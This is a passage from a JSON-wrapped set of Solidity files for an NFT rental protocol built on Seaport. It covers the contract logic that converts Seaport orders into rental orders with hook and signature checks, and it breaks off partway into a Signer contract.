`RentPayload`.\n     *\n     * @param payload Rent payload converted to a hash.\n     */\n    function getRentPayloadHash(\n        RentPayload memory payload\n    ) external view returns (bytes32) {\n        return _deriveRentPayloadHash(payload);\n    }\n\n    /**\n     * @notice Derives the order metadata EIP-712 compliant hash from an `OrderMetadata`.\n     *\n     * @param metadata Order metadata converted to a hash.\n     */\n    function getOrderMetadataHash(\n        OrderMetadata memory metadata\n    ) external view returns (bytes32) {\n        return _deriveOrderMetadataHash(metadata);\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            Internal Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @dev Helper function to emit an event which signals a rental order has started.\n     *\n     * @param order     Rental order to emit.\n     * @param orderHash Order hash of the seaport order.\n     * @param extraData Any extra data to be emitted which was supplied by the offerer.\n     */\n    function _emitRentalOrderStarted(\n        RentalOrder memory order,\n        bytes32 orderHash,\n        bytes memory extraData\n    ) internal {\n        // Emit the event.\n        emit Events.RentalOrderStarted(\n            orderHash,\n            extraData,\n            order.seaportOrderHash,\n            order.items,\n            order.hooks,\n            order.orderType,\n            order.lender,\n            order.renter,\n            order.rentalWallet,\n            order.startTimestamp,\n            order.endTimestamp\n        );\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a BASE order. All offer items must\n     *      adhere to the BASE order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processBaseOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal pure {\n        // Must be at least one offer item.\n        if (offers.length == 0) {\n            revert Errors.CreatePolicy_OfferCountZero();\n        }\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n\n        // Process each offer item.\n        for (uint256 i; i < offers.length; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                itemType = ItemType.ERC721;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                itemType = ItemType.ERC1155;\n            }\n            // ERC20s are not supported as offer items in a BASE order.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // An ERC721 or ERC1155 offer item is considered a rented asset which will be\n            // returned to the lender upon expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: SettleTo.LENDER,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the offer items for inclusion in a PAY order. All offer items must\n     *      adhere to the PAY order format, else execution will revert.\n     *\n     * @param rentalItems Running array of items that comprise the rental order.\n     * @param offers      Array of offer items to include in the the order.\n     * @param startIndex  Index to begin adding the offer items to the\n     *                    `rentalItems` array.\n     */\n    function _processPayOrderOffer(\n        Item[] memory rentalItems,\n        SpentItem[] memory offers,\n        uint256 startIndex\n    ) internal pure {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Define elements of the item which depend on the token type.\n        ItemType itemType;\n        SettleTo settleTo;\n\n        // Process each offer item.\n        for (uint256 i; i < offers.length; ++i) {\n            // Get the offer item.\n            SpentItem memory offer = offers[i];\n\n            // Handle the ERC721 item.\n            if (offer.isERC721()) {\n                // The ERC721 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC721;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Handle the ERC1155 item.\n            else if (offer.isERC1155()) {\n                // The ERC1155 will be returned to the lender upon expiration\n                // of the rental order.\n                itemType = ItemType.ERC1155;\n                settleTo = SettleTo.LENDER;\n\n                // Increment rentals.\n                totalRentals++;\n            }\n            // Process an ERC20 offer item.\n            else if (offer.isERC20()) {\n                // An ERC20 offer item is considered a payment to the renter upon\n                // expiration of the rental order.\n                itemType = ItemType.ERC20;\n                settleTo = SettleTo.RENTER;\n\n                // Increment payments.\n                totalPayments++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(offer.itemType);\n            }\n\n            // Create the item.\n            rentalItems[i + startIndex] = Item({\n                itemType: itemType,\n                settleTo: settleTo,\n                token: offer.token,\n                amount: offer.amount,\n                identifier: offer.identifier\n            });\n        }\n\n        // PAY order offer must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a BASE order. All\n     *      consideration items must adhere to the BASE order format, else\n     *      execution will revert.\n     *\n     * @param rentalItems    Running array of items that comprise the rental order.\n     * @param considerations Array of consideration items to include in the the order.\n     * @param startIndex     Index to begin adding the offer items to the\n     *                       `rentalItems` array.\n     */\n    function _processBaseOrderConsideration(\n        Item[] memory rentalItems,\n        ReceivedItem[] memory considerations,\n        uint256 startIndex\n    ) internal pure {\n        // Must be at least one consideration item.\n        if (considerations.length == 0) {\n            revert Errors.CreatePolicy_ConsiderationCountZero();\n        }\n\n        // Process each consideration item.\n        for (uint256 i; i < considerations.length; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Only process an ERC20 item.\n            if (!consideration.isERC20()) {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n\n            // An ERC20 consideration item is considered a payment to the lender upon\n            // expiration of the rental order.\n            rentalItems[i + startIndex] = Item({\n                itemType: ItemType.ERC20,\n                settleTo: SettleTo.LENDER,\n                token: consideration.token,\n                amount: consideration.amount,\n                identifier: consideration.identifier\n            });\n        }\n    }\n\n    /**\n     * @dev Processes the consideration items for inclusion in a PAYEE order. All\n     *      consideration items must adhere to the PAYEE order format, else\n     *      execution will revert.\n     *\n     * @param considerations Array of consideration items to include in the the order.\n     */\n    function _processPayeeOrderConsideration(\n        ReceivedItem[] memory considerations\n    ) internal pure {\n        // Keep track of each item type.\n        uint256 totalRentals;\n        uint256 totalPayments;\n\n        // Process each consideration item.\n        for (uint256 i; i < considerations.length; ++i) {\n            // Get the consideration item.\n            ReceivedItem memory consideration = considerations[i];\n\n            // Process an ERC20 item.\n            if (consideration.isERC20()) {\n                totalPayments++;\n            }\n            // Process an ERC721 or ERC1155 consideration item.\n            else if (consideration.isRental()) {\n                totalRentals++;\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    consideration.itemType\n                );\n            }\n        }\n\n        // PAYEE order consideration must have at least one rental and one payment.\n        if (totalRentals == 0 || totalPayments == 0) {\n            revert Errors.CreatePolicy_ItemCountZero(totalRentals, totalPayments);\n        }\n    }\n\n    /**\n     * @dev Converts an offer array and a consideration array into a single array of\n     *      `Item` which comprise a rental order. The offers and considerations must\n     *      adhere to a specific set of rules depending on the type of order being\n     *      constructed.\n     *\n     * @param offers         Array of Seaport offer items.\n     * @param considerations Array of seaport consideration items.\n     * @param orderType      Order type of the rental.\n     */\n    function _convertToItems(\n        SpentItem[] memory offers,\n        ReceivedItem[] memory considerations,\n        OrderType orderType\n    ) internal pure returns (Item[] memory items) {\n        // Initialize an array of items.\n        items = new Item[](offers.length + considerations.length);\n\n        // Process items for a base order.\n        if (orderType.isBaseOrder()) {\n            // Process offer items.\n            _processBaseOrderOffer(items, offers, 0);\n\n            // Process consideration items.\n            _processBaseOrderConsideration(items, considerations, offers.length);\n        }\n        // Process items for a pay order.\n        else if (orderType.isPayOrder()) {\n            // Process offer items.\n            _processPayOrderOffer(items, offers, 0);\n\n            // Assert that no consideration items are provided.\n            if (considerations.length > 0) {\n                revert Errors.CreatePolicy_ConsiderationCountNonZero(\n                    considerations.length\n                );\n            }\n        }\n        // Process items for a payee order.\n        else if (orderType.isPayeeOrder()) {\n            // Assert that no offer items are provided.\n            if (offers.length > 0) {\n                revert Errors.CreatePolicy_OfferCountNonZero(offers.length);\n            }\n\n            // Process consideration items.\n            _processPayeeOrderConsideration(considerations);\n        }\n        // Revert if order type is not supported.\n        else {\n            revert Errors.Shared_OrderTypeNotSupported(uint8(orderType));\n        }\n    }\n\n    /**\n     * @dev When a rental order is created, process each hook one by one but only if\n     *      the hook's status is set to execute on a rental start.\n     *\n     * @param hooks        Array of hooks to process for the order.\n     * @param offerItems   Array of offer items which are referenced by the hooks\n     * @param rentalWallet Address of the rental wallet which is the recipient\n     *                     of the rented assets.\n     */\n    function _addHooks(\n        Hook[] memory hooks,\n        SpentItem[] memory offerItems,\n        address rentalWallet\n    ) internal {\n        // Define hook target, offer item index, and an offer item.\n        address target;\n        uint256 itemIndex;\n        SpentItem memory offer;\n\n        // Loop through each hook in the payload.\n        for (uint256 i = 0; i < hooks.length; ++i) {\n            // Get the hook's target address.\n            target = hooks[i].target;\n\n            // Check that the hook is reNFT-approved to execute on rental start.\n            if (!STORE.hookOnStart(target)) {\n                revert Errors.Shared_DisabledHook(target);\n            }\n\n            // Get the offer item index for this hook.\n            itemIndex = hooks[i].itemIndex;\n\n            // Get the offer item for this hook.\n            offer = offerItems[itemIndex];\n\n            // Make sure the offer item is an ERC721 or ERC1155.\n            if (!offer.isRental()) {\n                revert Errors.Shared_NonRentalHookItem(itemIndex);\n            }\n\n            // Call the hook with data about the rented item.\n            try\n                IHook(target).onStart(\n                    rentalWallet,\n                    offer.token,\n                    offer.identifier,\n                    offer.amount,\n                    hooks[i].extraData\n                )\n            {} catch Error(string memory revertReason) {\n                // Revert with reason given.\n                revert Errors.Shared_HookFailString(revertReason);\n            } catch Panic(uint256 errorCode) {\n                // Convert solidity panic code to string.\n                string memory stringErrorCode = LibString.toString(errorCode);\n\n                // Revert with panic code.\n                revert Errors.Shared_HookFailString(\n                    string.concat(\"Hook reverted: Panic code \", stringErrorCode)\n                );\n            } catch (bytes memory revertData) {\n                // Fallback to an error that returns the byte data.\n                revert Errors.Shared_HookFailBytes(revertData);\n            }\n        }\n    }\n\n    /**\n     * @dev Initiates a rental order using a rental payload received by the fulfiller,\n     *      and a payload from seaport with data involving the assets that were\n     *      transferred in the order.\n     *\n     * @param payload Payload from the order fulfiller.\n     * @param seaportPayload Payload containing the result of a seaport order fulfillment.\n     */\n    function _rentFromZone(\n        RentPayload memory payload,\n        SeaportPayload memory seaportPayload\n    ) internal {\n        // Check: make sure order metadata is valid with the given seaport order zone hash.\n        _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);\n\n        // Check: verify the fulfiller of the order is an owner of the recipient safe.\n        _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);\n\n        // Check: verify each execution was sent to the expected destination.\n        _executionInvariantChecks(\n            seaportPayload.totalExecutions,\n            payload.fulfillment.recipient\n        );\n\n        // Check: validate and process seaport offer and consideration items based\n        // on the order type.\n        Item[] memory items = _convertToItems(\n            seaportPayload.offer,\n            seaportPayload.consideration,\n            payload.metadata.orderType\n        );\n\n        // PAYEE orders are considered mirror-images of a PAY order. So, PAYEE orders\n        // do not need to be processed in the same way that other order types do.\n        if (\n            payload.metadata.orderType.isBaseOrder() ||\n            payload.metadata.orderType.isPayOrder()\n        ) {\n            // Create an accumulator which will hold all of the rental asset updates, consisting of IDs and\n            // the rented amount. From this point on, new memory cannot be safely allocated until the\n            // accumulator no longer needs to include elements.\n            bytes memory rentalAssetUpdates = new bytes(0);\n\n            // Check if each item is a rental. If so, then generate the rental asset update.\n            // Memory will become safe again after this block.\n            for (uint256 i; i < items.length; ++i) {\n                if (items[i].isRental()) {\n                    // Insert the rental asset update into the dynamic array.\n                    _insert(\n                        rentalAssetUpdates,\n                        items[i].toRentalId(payload.fulfillment.recipient),\n                        items[i].amount\n                    );\n                }\n            }\n\n            // Generate the rental order.\n            RentalOrder memory order = RentalOrder({\n                seaportOrderHash: seaportPayload.orderHash,\n                items: items,\n                hooks: payload.metadata.hooks,\n                orderType: payload.metadata.orderType,\n                lender: seaportPayload.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + payload.metadata.rentDuration\n            });\n\n            // Compute the order hash.\n            bytes32 orderHash = _deriveRentalOrderHash(order);\n\n            // Interaction: Update storage only if the order is a Base Order or Pay order.\n            STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates));\n\n            // Interaction: Increase the deposit value on the payment escrow so\n            // it knows how many tokens were sent to it.\n            for (uint256 i = 0; i < items.length; ++i) {\n                if (items[i].isERC20()) {\n                    ESCRW.increaseDeposit(items[i].token, items[i].amount);\n                }\n            }\n\n            // Interaction: Process the hooks associated with this rental.\n            if (payload.metadata.hooks.length > 0) {\n                _addHooks(\n                    payload.metadata.hooks,\n                    seaportPayload.offer,\n                    payload.fulfillment.recipient\n                );\n            }\n\n            // Emit rental order started.\n            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n        }\n    }\n\n    /**\n     * @dev Checks that the order metadata passed with the seaport order is expected.\n     *\n     * @param metadata Order metadata that was passed in with the fulfillment.\n     * @param zoneHash Hash of the order metadata that was passed in when the Seaport\n     *                 order was signed.\n     */\n    function _isValidOrderMetadata(\n        OrderMetadata memory metadata,\n        bytes32 zoneHash\n    ) internal view {\n        // Check that the rent duration specified is not zero.\n        if (metadata.rentDuration == 0) {\n            revert Errors.CreatePolicy_RentDurationZero();\n        }\n\n        // Check that the zone hash is equal to the derived hash of the metadata.\n        if (_deriveOrderMetadataHash(metadata) != zoneHash) {\n            revert Errors.CreatePolicy_InvalidOrderMetadataHash();\n        }\n    }\n\n    /**\n     * @dev Checks that an address is the owner of a protocol-deployed rental safe.\n     *\n     * @param owner Address of the potential safe owner.\n     * @param safe  Address of the potential protocol-deployed rental safe.\n     */\n    function _isValidSafeOwner(address owner, address safe) internal view {\n        // Make sure only protocol-deployed safes can rent.\n        if (STORE.deployedSafes(safe) == 0) {\n            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n        }\n\n        // Make sure the fulfiller is the owner of the recipient rental safe.\n        if (!ISafe(safe).isOwner(owner)) {\n            revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);\n        }\n    }\n\n    /**\n     * @dev Helper function to check that an execution performed by Seaport resulting\n     *      in the expected address receiving the asset.\n     *\n     * @param execution Execution that was performed by Seaport.\n     * @param expectedRecipient Address which should now own the rented asset.\n     */\n    function _checkExpectedRecipient(\n        ReceivedItem memory execution,\n        address expectedRecipient\n    ) internal pure {\n        if (execution.recipient != expectedRecipient) {\n            revert Errors.CreatePolicy_UnexpectedTokenRecipient(\n                execution.itemType,\n                execution.token,\n                execution.identifier,\n                execution.amount,\n                execution.recipient,\n                expectedRecipient\n            );\n        }\n    }\n\n    /**\n     * @dev After a Seaport order has been executed, invariant checks are made to ensure\n     *      that all assets are owned by the correct addresses. More specifically, all\n     *      ERC20 tokens are sent to the payment escrow module, and all rental assets\n     *      are in the intended recipient's rental safe.\n     *\n     * @param executions Each execution that was performed by Seaport.\n     * @param expectedRentalSafe The intended recipient of the rental assets.\n     */\n    function _executionInvariantChecks(\n        ReceivedItem[] memory executions,\n        address expectedRentalSafe\n    ) internal view {\n        for (uint256 i = 0; i < executions.length; ++i) {\n            ReceivedItem memory execution = executions[i];\n\n            // ERC20 invariant where the recipient must be the payment escrow.\n            if (execution.isERC20()) {\n                _checkExpectedRecipient(execution, address(ESCRW));\n            }\n            // ERC721 and ERC1155 invariants where the recipient must\n            // be the expected rental safe.\n            else if (execution.isRental()) {\n                _checkExpectedRecipient(execution, expectedRentalSafe);\n            }\n            // Revert if unsupported item type.\n            else {\n                revert Errors.CreatePolicy_SeaportItemTypeNotSupported(\n                    execution.itemType\n                );\n            }\n        }\n    }\n\n    /////////////////////////////////////////////////////////////////////////////////\n    //                            External Functions                               //\n    /////////////////////////////////////////////////////////////////////////////////\n\n    /**\n     * @notice Callback function implemented to make this contract a valid Seaport zone.\n     *         It can be considered the entrypoint to creating a rental. When a seaport\n     *         order specifies the create policy as its zone address, Seaport will call\n     *         this function after each order in the batch is processed. A call to\n     *         `validateOrder` is what kicks off the rental process, and performs steps\n     *         to convert a seaport order into a rental order which is stored\n     *         by the protocol.\n     *\n     * @param zoneParams Parameters from the seaport order.\n     *\n     * @return validOrderMagicValue A `bytes4` value to return back to Seaport.\n     */\n    function validateOrder(\n        ZoneParameters calldata zoneParams\n    ) external override onlyRole(\"SEAPORT\") returns (bytes4 validOrderMagicValue) {\n        // Decode the signed rental zone payload from the extra data.\n        (RentPayload memory payload, bytes memory signature) = abi.decode(\n            zoneParams.extraData,\n            (RentPayload, bytes)\n        );\n\n        // Create a payload of seaport data.\n        SeaportPayload memory seaportPayload = SeaportPayload({\n            orderHash: zoneParams.orderHash,\n            zoneHash: zoneParams.zoneHash,\n            offer: zoneParams.offer,\n            consideration: zoneParams.consideration,\n            totalExecutions: zoneParams.totalExecutions,\n            fulfiller: zoneParams.fulfiller,\n            offerer: zoneParams.offerer\n        });\n\n        // Check: The signature from the protocol signer has not expired.\n        _validateProtocolSignatureExpiration(payload.expiration);\n\n        // Check: The fulfiller is the intended fulfiller.\n        _validateFulfiller(payload.intendedFulfiller, seaportPayload.fulfiller);\n\n        // Recover the signer from the payload.\n        address signer = _recoverSignerFromPayload(\n            _deriveRentPayloadHash(payload),\n            signature\n        );\n\n        // Check: The data matches the signature and that the protocol signer is the one that signed.\n        if (!kernel.hasRole(signer, toRole(\"CREATE_SIGNER\"))) {\n            revert Errors.CreatePolicy_UnauthorizedCreatePolicySigner();\n        }\n\n        // Initiate the rental using the rental manager.\n        _rentFromZone(payload, seaportPayload);\n\n        // Return the selector of validateOrder as the magic value.\n        validOrderMagicValue = ZoneInterface.validateOrder.selector;\n    }\n}"
    },
    {
      "filename": "src/packages/Signer.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.20;\n\nimport {ECDSA} from \"@openzeppelin-contracts/utils/cryptography/ECDSA.sol\";\n\nimport {\n    RentPayload,\n    Hook,\n    RentalOrder,\n    OrderFulfillment,\n    OrderMetadata,\n    Item\n} from \"@src/libraries/RentalStructs.sol\";\nimport {Errors} from \"@src/libraries/Errors.sol\";\n\n/**\n * @title Signer\n * @notice Contains logic related to signed payloads and signature verification when\n *         creating rentals.\n */\nabstract contract Signer {\n    using ECDSA for bytes32;\n\n    // Declare constants for name and version.\n    string internal constant _NAME = \"ReNFT-Rentals\";\n    string internal constant _VERSION = \"1.0.0\";\n\n    // Precompute hashes, original chainId, and domain separator on deployment.\n    bytes32 internal immutable _NAME_HASH;\n    bytes32 internal immutable _VERSION_HASH;\n    bytes32 internal immutable _EIP_712_DOMAIN_TYPEHASH;\n    uint256 internal immutable _CHAIN_ID;\n    bytes32 internal immutable _DOMAIN_SEPARATOR;\n    bytes32 internal immutable _ITEM_TYPEHASH;\n    bytes32 internal immutable _HOOK_TYPEHASH;\n    bytes32 internal immutable _RENTAL_ORDER_TYPEHASH;\n    bytes32 internal immutable _ORDER_FULFILLMENT_TYPEHASH;\n    bytes32 internal immutable _ORDER_METADATA_TYPEHASH;\n    bytes32 internal immutable _RENT_PAYLOAD_TYPEHASH;\n\n    /**\n     * @dev Sets up the type hashes and sets the chain ID.\n     */\n    constructor() {\n        // Derive name, version, and EIP-712 typehashes.\n        (\n            _NAME_HASH,\n            _VERSION_HASH,\n            _EIP_712_DOMAIN_TYPEHASH,\n            _DOMAIN_SEPARATOR\n        ) = _deriveTypehashes();\n\n        // Derive name and version hashes alongside required EIP-712 typehashes.\n        (\n            _ITEM_TYPEHASH,\n            _HOOK_TYPEHASH,\n            _RENTAL_ORDER_TYPEHASH,\n            _ORDER_FULFILLMENT_TYPEHASH,\n            _ORDER_METADATA_TYPEHASH,\n            _RENT_PAYLOAD_TYPEHASH\n        ) = _deriveRentalTypehashes();\n\n        // Store the current chainId and derive the current domain separator.\n        _CHAIN_ID = block.chainid;\n    }\n\n    /**\n     * @dev Validates that the expected fulfiller of the order is the same as the address\n     *      executed the order. This check is meant to prevent order sniping where one\n     *      party receives a server-side signature but another party intercepts the\n     *      signature and uses it.\n     *\n     * @param intendedFulfiller Address that was expected to execute the order.\n     * @param actualFulfiller   Address that actually executed the order.\n     */\n    function _validateFulfiller(\n        address intendedFulfiller,\n        address actualFulfiller\n    ) internal pure {\n        // Check actual fulfiller against the intended fulfiller.\n        if (intendedFulfiller != actualFulfiller) {\n            revert Errors"
    }
  ]
}